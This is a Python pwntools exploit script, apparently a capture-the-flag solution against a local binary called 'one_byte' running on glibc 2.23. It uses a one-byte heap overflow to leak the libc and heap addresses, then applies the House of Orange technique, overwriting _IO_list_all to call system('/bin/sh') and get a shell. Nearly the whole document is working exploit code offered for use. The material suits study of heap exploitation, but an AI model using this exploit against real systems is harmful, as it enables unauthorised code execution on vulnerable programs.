#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./one_byte', checksec=False)

libc = ELF('../.glibc/glibc_2.23/libc.so.6', checksec=False)

index = 0

gs = """
b *main
b *main+244
b *main+311
b *main+415
b *main+480
b *main+560
b *main+652
b *main+713
b *main+788
"""

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.remote:
        return remote('', )
    else:
        return process(elf.path)

def malloc():
    global index
    io.sendline(b'1')
    io.recvuntil(b'> ')
    index += 1
    return index - 1
    
def free(index):
    io.sendline(b'2')
    io.sendlineafter(b'index: ', str(index).encode())
    io.recvuntil(b'> ')

def edit(index, data):
    io.sendline(b'3')
    io.sendlineafter(b'index: ', str(index).encode())
    io.sendafter(b'data: ', data)
    io.recvuntil(b'> ')

def read(index):
    io.sendline(b'4')
    io.sendlineafter(b'index: ', str(index).encode())
    output = io.recv(0x58)
    io.recvuntil(b'> ')
    return output

def quit():
    io.sendline(b'5')
    
io = start()
io.recvuntil(b'> ')

chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

# ===================================================================================================
# Leak libc
edit(chunk_A, p8(0)*0x58 + p8(0xc1))
free(chunk_B)

chunk_B2 = malloc()

unsortedbin_data = read(chunk_C)
unsortedbin = u64(unsortedbin_data[0:8])
libc.address = unsortedbin - 0x399b78

info("unsortedbin: " + hex(unsortedbin))
info("libc base: " + hex(libc.address))


# ===================================================================================================
# Leak heap

chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

fastbin_data = read(chunk_C)
heap = u64(fastbin_data[0:8])
info("heap: " + hex(heap))

# ===================================================================================================
# house of oragne
chunk_C3 = malloc()
chunk_A2 = malloc()

edit(chunk_A2, p8(0)*0x58 + p8(0xc1))
free(chunk_B2)

chunk_B3 = malloc()

# string "/bin/sh" to _flag size field
edit(chunk_B3, p64(0)*10 + b'/bin/sh\x00' + p8(0x68))
#edit(chunk_B3, p64(0)*10 + b'/bin/sh\x00' + p8(0xb1))
payload = \
p64(0) + p64(libc.sym['_IO_list_all'] - 0x10) +\
p64(1) + p64(2) 

edit(chunk_C3, payload)

edit(chunk_E, p64(libc.sym['system']) + p64(heap + 0x178))

io.sendline(b'1')
io.interactive()
